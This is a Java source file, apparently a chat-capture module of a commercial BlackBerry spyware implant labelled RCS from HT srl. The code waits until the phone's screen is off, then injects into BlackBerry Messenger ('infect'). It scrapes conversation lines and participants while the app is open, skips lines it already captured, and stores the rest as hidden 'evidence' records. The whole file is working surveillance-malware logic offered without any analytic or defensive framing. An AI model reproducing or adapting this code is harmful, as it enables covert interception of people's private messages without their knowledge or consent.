//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : TaskAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.util.Vector;

import net.rim.device.api.system.Backlight;
import blackberry.AppListener;
import blackberry.Device;
import blackberry.Messages;
import blackberry.config.ConfModule;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.manager.ModuleManager;
import blackberry.module.im.AppInjectorBBM;
import blackberry.module.im.LineMarkup;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * Instant Message.
 */
public final class ModuleChat extends BaseModule implements BacklightObserver,
        ApplicationObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModChat", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private static final long APP_TIMER_PERIOD = 5000;

    AppInjectorBBM appInjector;
    //boolean infected;

    String appName = Messages.getString("1a.a"); //"Messenger"; //$NON-NLS-1$

    LineMarkup markup;
    boolean infecting = false;

    //boolean enableInfect;
    boolean isAppForeground;

    private boolean unsupported;

    public static String getStaticType() {
        return Messages.getString("1a.0"); //"chat"; //$NON-NLS-1$
    }

    public static ModuleChat getInstance() {
        return (ModuleChat) ModuleManager.getInstance().get(getStaticType());
    }

    /**
     * Instantiates a new task agents
     * 
     * @param agentStatus
     *            the agent status
     */
    public ModuleChat() {
        
    }

    protected boolean parse(ConfModule conf) {
        //#ifdef DEBUG
        debug.trace("parse"); //$NON-NLS-1$
        //#endif

        if (!Device.getInstance().atLeast(5, 0)) {
            //#ifdef DEBUG
            debug.error("ChatAgent: not supported before OS 5.0"); //$NON-NLS-1$
            //#endif
            enable(false);
            setDelay(NEVER);
            return false;
        }

        if (!Device.getInstance().lessThan(8, 0)) {
            //#ifdef DEBUG
            debug.error("ChatAgent: not supported for OS 7.x"); //$NON-NLS-1$
            //#endif
            enable(false);
            setDelay(NEVER);
            return false;
        }

        setPeriod(APP_TIMER_PERIOD);
        setDelay(APP_TIMER_PERIOD);

        markup = new LineMarkup(getStaticType());
        
        appInjector = AppInjectorBBM.getInstance();
        
        //#ifdef DEBUG
        debug.trace("parse end");
        //#endif
        return true;
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart"); //$NON-NLS-1$
        //#endif

        if (unsupported) {
            return;
        }

        AppListener.getInstance().addBacklightObserver(this);
        AppListener.getInstance().addApplicationObserver(this);

        try {
            if (appInjector == null) {
                appInjector = AppInjectorBBM.getInstance();
            } else {
                appInjector.reset();
            }

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("actualStart: " + ex); //$NON-NLS-1$
            //#endif
        }

        if (!status.backlightEnabled() && !appInjector.isInfected()) {
            //#ifdef DEBUG
            debug.info("injecting"); //$NON-NLS-1$
            //#endif

            appInjector.infect();
        }
    }

    public void actualLoop() {
        if (unsupported) {
            return;
        }

        //#ifdef DEBUG
        debug.trace("actualLoop: start");
        //#endif
        
        if (appInjector.isInfected() && status.backlightEnabled()
                && isAppForeground) {
            //#ifdef DEBUG
            debug.info("actualLoop, infected, enabled, foreground"); //$NON-NLS-1$
            //#endif

            appInjector.callMenuInContext();
        }else{
            //#ifdef DEBUG
            debug.trace("actualLoop, nothing to do. Infected: " + appInjector.isInfected());
            //#endif
        }
        
        Utils.sleep(3000);
        //#ifdef DEBUG
        debug.trace("actualLoop: end");
        //#endif
    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop"); //$NON-NLS-1$
        //#endif

        AppListener.getInstance().removeBacklightObserver(this);
        AppListener.getInstance().removeApplicationObserver(this);
    }

    private synchronized void serialize(String partecipants, String lastLine) {
        //#ifdef DEBUG
        debug.trace("serialize: " + lastLine); //$NON-NLS-1$
        //#endif

        if (!markup.isMarkup()) {
            markup.createEmptyMarkup();
        }

        markup.put(partecipants, lastLine);
    }

    private synchronized String unserialize(String partecipants) {
        //#ifdef DEBUG
        debug.trace("unserialize: " + partecipants); //$NON-NLS-1$
        //#endif
    
        if (markup.isMarkup()) {
            String lastLine = markup.getLine(partecipants);
    
            //#ifdef DEBUG
            debug.trace("unserialized: " + lastLine); //$NON-NLS-1$
            //#endif
            return lastLine;
        }
    
        return null;
    }

    public void onBacklightChange(boolean on) {
        if (!on && !appInjector.isInfected()) {
            //#ifdef DEBUG
            debug.info("onBacklightChange, injecting"); //$NON-NLS-1$
            //#endif

            appInjector.infect();
        }
    }

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {
        if (startedName != null && startedName.indexOf(appName) >= 0) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: foreground"); //$NON-NLS-1$
            //#endif
            isAppForeground = true;
            if (Backlight.isEnabled()) {
                // se l'utente non e' mai andato  su bbm e' possibile che non si sia mai registrato
                //enableInfect = true;
            }
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: not foreground"); //$NON-NLS-1$
            //#endif
            isAppForeground = false;
        }
    }

    public synchronized void add(String partecipants, Vector lines) {
        if (lines == null) {
            //#ifdef DEBUG
            debug.error("add: null lines"); //$NON-NLS-1$
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.trace("add : " + partecipants + " lines: " + lines.size()); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        if (lines.size() == 0) {
            //#ifdef DEBUG
            debug.trace("add: no lines, skipping"); //$NON-NLS-1$
            //#endif
            return;
        }

        //#ifdef DBC
        Check.asserts(lines != null, "null lines"); //$NON-NLS-1$
        //#endif

        String lastLine = unserialize(partecipants);

        if (lines.lastElement().equals(lastLine)) {
            //#ifdef DEBUG
            debug.trace("add: nothing new"); //$NON-NLS-1$
            //#endif
            return;
        }

        int lastEqual;
        for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
            if (lines.elementAt(lastEqual).equals(lastLine)) {
                //#ifdef DEBUGs
                debug.trace("add found equal at line: " + lastEqual); //$NON-NLS-1$
                //#endif
                break;
            }
        }

        if (lastEqual <= 0) {
            lastEqual = -1;
            //#ifdef DEBUG
            debug.info("add: no found, save everything."); //$NON-NLS-1$
            //#endif
        }

        try {
            lastLine = (String) lines.lastElement();
            //#ifdef DEBUG
            debug.trace("add, serialize lastLine: " + lastLine); //$NON-NLS-1$
            //#endif

            serialize(partecipants, lastLine);
            //#ifdef DEBUG
            debug.trace("write evidence from line: " + lastEqual + 1); //$NON-NLS-1$
            //#endif
            writeEvidence(partecipants, lines, lastEqual + 1);

            //#ifdef DEBUG
            debug.trace("add end"); //$NON-NLS-1$
            //#endif
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("add: " + ex); //$NON-NLS-1$
            //#endif
        }
    }

    private void writeEvidence(String partecipants, Vector lines, int startFrom) {
        //#ifdef DEBUG
        debug.trace("writeEvidence"); //$NON-NLS-1$
        //#endif

        //#ifdef DBC
        Check.requires(lines != null, "Null lines"); //$NON-NLS-1$
        Check.requires(lines.size() > startFrom,
                "writeEvidence wrong startFrom: " + startFrom); //$NON-NLS-1$
        //#endif

        String imname = Messages.getString("1a.1"); //$NON-NLS-1$
        String topic = ""; //$NON-NLS-1$
        String users = partecipants;

        DateTime datetime = new DateTime();
        final Vector items = new Vector();

        for (int i = startFrom; i < lines.size(); i++) {

            String chatcontent = (String) lines.elementAt(i);

            items.addElement(datetime.getStructTm());
            items.addElement(WChar.getBytes(imname, true));
            items.addElement(WChar.getBytes(topic, true));
            items.addElement(WChar.getBytes(users, true));
            items.addElement(WChar.getBytes(chatcontent, true));
            items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
        }

        Evidence evidence = new Evidence(EvidenceType.CHAT);
        evidence.atomicWriteOnce(items);

    }

    //#ifdef DEBUG
    public void disinfect() {
        if (appInjector != null) {
            appInjector.disinfect();
        }
    }
    //#endif

}
